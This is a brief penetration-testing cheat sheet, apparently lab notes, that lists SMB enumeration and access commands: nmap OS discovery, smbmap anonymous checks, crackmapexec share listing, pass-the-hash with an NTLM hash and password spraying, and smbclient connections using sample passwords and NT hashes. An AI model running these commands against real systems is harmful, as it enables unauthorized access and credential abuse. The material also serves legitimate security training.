
# nmap to get basic info
```bash
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

-----------------------

# check for anonymous share
```bash
smbmap -H <IP> -u '' -p ''
```

-----------------------

# list share of particular user with username and password
```bash
crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
```

-----------------------

# list share of particular user with NTLM hash
```bash
crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
```

-----------------------

# password spraying
```bash
crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
```

-----------------------

# Connect to SMB share
```bash
smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
```
